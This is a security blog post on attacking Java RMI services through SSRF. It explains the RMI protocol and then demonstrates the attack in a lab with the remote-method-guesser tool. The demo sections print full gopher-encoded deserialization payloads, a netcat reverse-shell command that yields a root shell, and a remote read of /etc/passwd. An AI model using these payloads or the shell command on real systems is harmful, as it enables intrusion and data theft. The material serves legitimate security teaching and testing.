---
title: "Attacking Java RMI via SSRF"
date: 2021-12-10
author: "Tobias Neitzel"

tags: 
- rmi
- jmx
- ssrf
- java rmi
- remote-method-guesser

categories:
- java
- ssrf

ShowToc: True
cover:
    image: "/img/01-rmi-ssrf/01-intro.png"
    alt: "Attacking Java RMI via SSRF"
---


During the last couple of years, *SSRF* vulnerabilities
have become more and more popular and several high impact
vulnerabilities have been identified. Possible targets in
the backend range from *HTTP* based services like *Solr*,
over cloud metadata services, up to more exotic targets
like *redis* databases. In this blog post we discuss the
*SSRFibility* of *Java RMI* and demonstrate how *RMI*
services can be targeted via *SSRF*.


### The SSRFibility of Java RMI

---

*Java RMI* is an object oriented *RPC* (*Remote Procedure Call*) mechanism
that is available by default in most *Java* installations. Developers can
use *Java RMI* to create *remote objects* that expose their functions on
the network and allow remote clients to call them. *Java RMI* communication
relies on serialized *Java* objects, which makes the protocol a prime target
for attackers. Over the last couple of years, the security of *Java RMI*
has vastly improved, but vulnerable endpoints are still encountered quite
frequently. Moreover, even a fully patched *RMI* service can yield as an
entry point for attackers when the available *remote objects* expose dangerous
functions.

If you ever implemented something yourself using *Java RMI*, you probably
doubt that the protocol can be targeted by *SSRF* attacks. For those who
never used *Java RMI* in practice, here is a short example how a typical *RMI*
client looks like:

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExampleClient {

  public static void main(String[] args) {

    try {
      Registry registry = LocateRegistry.getRegistry(remoteHost);
      RemoteService ref = (RemoteService)registry.lookup("remote-service");
      String response = ref.getVersion();
    
    } catch( Exception e) {
      e.printStackTrace();
    }
  }
}
```

This code snipped does basically the following:

1. Connect to an *RMI registry* (name service for *remote objects*. Can be compared to *DNS*)
2. Lookup the name ``remote-service`` to obtain a reference to an *remote object*
3. Call the ``getVersion`` function on the *remote object*

Despite ``ref`` is an object created in your local *JVM*, calls on this object
are forwarded to the *RMI* server. This demonstrates that *Java RMI* uses an *object
oriented RPC* mechanism, where local objects are used to consume remote services.
This *object oriented RPC* implementation creates the impression of a strong coupling
between the local objects and the remote service which makes *SSRF* attacks seem impossible.
But this is not the case as the *RMI protocol* is, like *HTTP*, a stateless protocol and
there is only a loosely coupling between local objects and remote services. But we go ahead
of ourselves as we should start with the *RMI registry*.

#### The RMI Registry

The *RMI registry* is a naming service that is often used to make *RMI* services available
on the network. In order to connect to a *remote object*, clients usually need a certain
amount of information:

* The IP address and TCP port the *remote object* is available on
* The class / interface that is implemented by the *remote object*
* The ``ObjID`` of the *remote object* (an internal identifier)

All this information is stored within the *RMI registry*  and can be accessed under a human readable
name (*boundname*). In the example above, we looked up the human readable name ``remote-service``
from the *RMI registry* and obtained a reference to the corresponding *remote object*. This reference
stores all the required information for remote procedure calls and forwards method invocations to
the *remote object*.

An important detail is now, that the *RMI registry* is a *remote object* itself, but in contrast
to the ``RemoteService`` *remote object*, the *RMI registry* is a well known *remote object*. This
means, that the implemented class and the assigned ``ObjID`` are fixed and known by *RMI clients*.
Hence, to communicate with the *RMI registry*, only the IP address and the TCP port are required.
This makes the *RMI registry* an easier target for *SSRF* attacks and we discuss it first before
going over to non well known *RMI services*.

#### The Java RMI Protocol

Whether or not the *RMI registry* can now be targeted by *SSRF* attacks depends on the structure of the
*RMI* protocol. In the following diagram I tried to visualize how a typical *RMI* communication looks like:

![Java RMI Protocol](/img/01-rmi-ssrf/02-java-rmi-protocol.png)

The typical *RMI* communication consists out of a *handshake* and one or more *method calls*. During the
*handshake*, some static data and information on the server and client host are exchanged. It is worth noting
that none of the exchanged information depends on previously received data. Therefore, it is possible
to predict all values that are used in the handshake, which will be important when performing *SSRF* attacks.

After the *handshake* completed, the client can start to dispatch method calls. It is generally possible
to dispatch multiple method calls in one communication channel, but apart from reducing the amount of
network traffic, it does not has any benefits. As mentioned previously, the *RMI* protocol is stateless and
it makes no difference whether multiple calls are dispatched in one or within multiple communication channels.

From the *SSRF* perspective, the handshake part of the *RMI* protocol looks problematic. *SSRF* vulnerabilities
usually only allow a one shot kind of attack and interactive communication like a handshake is not possible.
In the case of *Java RMI* however, the handshake does not matter, as the *RMI server* reads data one by one from
the underlying *TCP* stream. This allows the client to send all required data right at the beginning without waiting
for any server responses. The following diagram shows the *RMI* protocol again, but this time how it would be
utilized during an *SSRF* attack:

![Java RMI Protocol During SSRF](/img/01-rmi-ssrf/03-java-rmi-protocol-ssrf.png)

Another problem we have not talked about so far are data types. It should be obvious that a basic *HTTP* based
*SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
(*RMI Magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
able to send arbitrary bytes to the target *RMI service*, which is an annoying restriction. Especially null bytes need
to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions \[[1](https://www.digeex.de/blog/tinytinyrss/)\].
However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
calls as with a direct connection.

#### The ObjID Problem

An attack as demonstrated in *figure 2* requires the client to know all data that needs to be send to the *RMI server*
in advance. This is possible for well known *RMI* services with a fixed ``ObjID`` value like the *RMI registry* (``ObjID = 0``),
the *Activation System* (``ObjID = 1``) or the *Distributed Garbage Collector* (``ObjID = 2``). Other *remote objects*
get a random ``ObjID`` assigned when they are exported (bound to a *TCP* port). Guessing an ``ObjID`` is basically impossible,
as it consists out of the following components:

* ``objNum`` - A random ``long`` value created by ``SecureRandom`` (set once per object)
* ``UID`` - Compound Object
  * ``unique``- A random ``int`` value created by ``SecureRandom`` (set once per host)
  * ``time`` - A timestamp created during export as ``int`` value
  * ``count`` - An incrementing ``short`` starting at ``Shot.MIN_VALUE``

Getting the ``ObjID`` value for a *remote object* is one of the reasons why *RMI* clients usually need to talk to an *RMI registry*.

So, are *SSRF* attacks on custom *RMI endpoints* impossible now? Well, not completely impossible, but they require an *SSRF* vulnerability
with even more capabilities as in the previous case. Instead of performing a *one shot* attack, we now need at least two shots:

1. Use the *SSRF* vulnerability to perform a ``lookup`` call on the registry
2. Use the obtained ``ObjID`` value to target the *remote object* via *SSRF*

For this to work we obviously need an *SSRF* vulnerability that returns data obtained from the targeted endpoint. Furthermore, the *SSRF*
need to allow arbitrary bytes within the returned data, including null bytes. *SSRF* vulnerabilities with these properties are extremely
rare, but when all conditions are met, you can consume any *RMI* service as with a direct connection.


### Attacking the RMI Registry

To demonstrate the *SSRFibility* of the *Java RMI* protocol, we will now attack an *RMI registry* endpoint using a
webapplication that is vulnerable to *SSRF* attacks. In order to make this as comfortable as possible, we use *remote-method-guesser*
\[[2](https://github.com/qtc-de/remote-method-guesser)\], a *Java RMI* vulnerability scanner with integrated *SSRF* support.
The *remote-method-guesser* repository also contains an *SSRF* example server \[[3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)\]
that we can use for demonstration purposes. The setup for the following demonstration looks like this:

* *HTTP* service vulnerable to *SSRF* within the ``url`` parameter on ``http://172.17.0.2:8000``
* *RMI registry* listening at ``localhost:1090`` on the remote server
* Outdated Java version that is vulnerable to *RMI registry* deserialization bypasses
* ``CommonsCollections3.1`` being available on the *RMI* application's classpath
* The *SSRF* vulnerability is *curl* based and allows null bytes within the *gopher* protocol

We start of with an *nmap* scan to demonstrate that no *RMI* ports are exposed directly by the application server:

```console
$ nmap -p- -n 172.17.0.2
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 07:57 CET
Nmap scan report for 172.17.0.2
Host is up (0.000094s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

To demonstrate the *SSRF* vulnerability, we just use a plain *HTTP* callback:

```console
$ curl 'http://172.17.0.2:8000?url=http://172.17.0.1:8000/PoC'
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [20/Dec/2021 08:01:20] "GET /PoC HTTP/1.1" 200 -
```

Now we perform a deserialization attack on the *RMI registry*. The *Java* version on the application server
already implements deserialization filters for *registry* communication, but is vulnerable to known deserialization
filter bypasses. These bypasses work by creating an outbound *RMI* connection to an attacker controlled server.
This outbound connection is no longer protected by deserialization filters and can be used to achieve arbitrary
deserialization.

First we create the required listeners: One for the incoming *RMI* connection, the other for the incoming shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
```

Now we create the *SSRF* payload. Creating *SSRF* payloads with *remote-method-guesser* is quite simple. Almost
each operation supports the ``--ssrf`` option. Instead of performing the corresponding operation on a remote server,
a corresponding *SSRF* payload is printed to stdout. For our purpose we need to target the *RMI registry* on the
remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the most
recent deserialization filter bypass:

```console
$ rmg serial 127.0.0.1 1090 AnTrinh 172.17.0.1:4444 --component reg --ssrf --gopher --encode
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578
```

*SSRF* payloads can be generated in different formats. We choose *gopher* format and *URL* encode the
payload to make it directly usable within a *curl* command. Now we only need to send this payload to the
remote server:

```console
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578'
```

This should cause incoming connections on our listeners and we should obtain a shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
Have connection from /172.17.0.2:51246
Reading message...
Sending return with payload for obj [0:0:0, 123]
Closing connection

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:33809.
id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully used a blind *SSRF* vulnerability to attack a vulnerable *RMI registry*. The following gif
shows all of the above mentioned steps in action:

![RMI SSRF Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/ssrf.gif)


### Attacking a Custom RMI Service

The ssrf-server [3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server) from
the *remote-method-guesser* repository runs one custom *RMI service* that is, like the *RMI registry*, only reachable from localhost.
The corresponding service implements the ``IFileManager`` interface with the following method signatures:

```java
public interface IFileManager extends Remote
{
    File[] list(String dir) throws RemoteException;
    byte[] read(String file) throws RemoteException, IOException;
    String write(String file, byte[] content) throws RemoteException, IOException;
    String copy(String src, String dest) throws RemoteException, IOException, InterruptedException;
}
```

We want to use the *SSRF* vulnerability in the *HTTP* frontend to call the ``read`` method and extract the ``/etc/passwd``
file from the server. Sounds easy, but we need to obtain the *TCP* endpoint and the ``ObjID`` value of the *remote object*
first and are required to perform a lookup operation on the *RMI registry* via *SSRF*. For this purpose, we can again use
*remote-method-guesser*.

When using *remote-method-guesser's* ``enum`` action, several different checks are performed on the targeted *RMI endpoint*.
On *RMI registry* endpoints, one of the checks includes a lookup for all available *remote objects*. When using the ``--ssrf``
option together with the ``enum`` action, it is not possible to perform multiple checks at once and the created *SSRF* payload
performs only a single check. You can use the ``--scan-action <ACTION>`` option to select which check you want to perform.
In out case, we want to perform the ``list`` check, that lists all available bound names within the *RMI registry*:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df' --silent | xxd -p -c1000
4e00093132372e302e302e31000083b051aced0005770f019dd4a2bf0000017ddbb22e468007757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d6
```

The *ssrf-server* we are using implements an *SSRF* vulnerability that is capable of returning binary data. This binary
data now contains the response from the *RMI registry*. To extract the required information from the response, we can
use *remote-method-guesser's* ``--ssrf-response`` option. This option takes the hex encoded response from an *RMI endpoint*
and interprets it in the specified context:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --ssrf-response 4e00093132372e302e302e31000083b051aced0005770f019dd4a2bf0000017ddbb22e468007757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 	- jmxrmi
```

Now we obtained the available *bound names* within the *RMI registry*, but we are still missing the *TCP* endpoint and the ``ObjID`` value.
The problem here is that *remote-method-guesser* needs to perform a call to the registry's ``list`` function first, before it can perform the
``lookup`` call.  As only one call is possible per *SSRF* attack, the ``lookup`` action is therefore missing. However, we can use the
``--bound-name`` option to specify the targeted *bound name* directly and *remote-method-guesser* skips the ``list`` call in this case:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name FileManager --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572' --silent | xxd -p -c1000
4e00093132372e302e302e31000083b851aced0005770f019dd4a2bf0000017ddbb22e46800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f7374000088a9508c910dd1597f3e9dd4a2bf0000017ddbb22e4680010178
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name FileManager --ssrf-response 4e00093132372e302e302e31000083b851aced0005770f019dd4a2bf0000017ddbb22e46800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f7374000088a9508c910dd1597f3e9dd4a2bf0000017ddbb22e4680010178
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager (unknown class)
[+] 		    Endpoint: localhost:34985 ObjID: [-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://localhost:8000/rmi-class-definitions.jar
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManage
```

Now we have everything what we need. The targeted *remote object* listens on ``localhost:34985`` with an ``ObjID`` of
``[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]``. We can now use *remote-method-guesser's* ``call`` action, to call
the ``read`` method on this object:

```console
$ rmg call 127.0.0.1 34985 '"/etc/passwd"' --signature 'byte[] read(String file)' --objid '[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]' --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A34985%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2550%258c%2591%250d%25d1%2559%257f%253e%259d%25d4%25a2%25bf%2500%2500%2501%257d%25db%25b2%252e%2546%2580%2501%25ff%25ff%25ff%25ff%258c%256a%255e%2578%25a5%2563%252a%258f%2574%2500%250b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%256
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A34985%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2550%258c%2591%250d%25d1%2559%257f%253e%259d%25d4%25a2%25bf%2500%2500%2501%257d%25db%25b2%252e%2546%2580%2501%25ff%25ff%25ff%25ff%258c%256a%255e%2578%25a5%2563%252a%258f%2574%2500%250b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564' --silent | xxd -p -c10000
4e00093132372e302e302e310000b1ee51aced0005770f019dd4a2bf0000017ddbb22e468018757200025b42acf317f8060854e0020000707870000004d4726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f6173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a31333a6e6577733a2f7573722f6c69622f6e6577733a2f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31343a757563703a2f7661722f73706f6f6c2f757563707075626c69633a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a6d616e3a783a31333a31353a6d616e3a2f7573722f6d616e3a2f7362696e2f6e6f6c6f67696e0a706f73746d61737465723a783a31343a31323a706f73746d61737465723a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a63726f6e3a783a31363a31363a63726f6e3a2f7661722f73706f6f6c2f63726f6e3a2f7362696e2f6e6f6c6f67696e0a6674703a783a32313a32313a3a2f7661722f6c69622f6674703a2f7362696e2f6e6f6c6f67696e0a737368643a783a32323a32323a737368643a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a61743a783a32353a32353a61743a2f7661722f73706f6f6c2f63726f6e2f61746a6f62733a2f7362696e2f6e6f6c6f67696e0a73717569643a783a33313a33313a53717569643a2f7661722f63616368652f73717569643a2f7362696e2f6e6f6c6f67696e0a7866733a783a33333a33333a5820466f6e74205365727665723a2f6574632f5831312f66733a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a33353a33353a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a63797275733a783a38353a31323a3a2f7573722f63797275733a2f7362696e2f6e6f6c6f67696e0a76706f706d61696c3a783a38393a38393a3a2f7661722f76706f706d61696c3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a3132333a3132333a4e54503a2f7661722f656d7074793a2f7362696e2f6e6f6c6f67696e0a736d6d73703a783a3230393a3230393a736d6d73703a2f7661722f73706f6f6c2f6d71756575653a2f7362696e2f6e6f6c6f67696e0a67756573743a783a3430353a3130303a67756573743a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a6375726c5f757365723a783a3130303a3130313a4c696e757820557365722c2c2c3a2f686f6d652f6375726c5f757365723a2f7362696e2f6e6f6c6f67696e0a
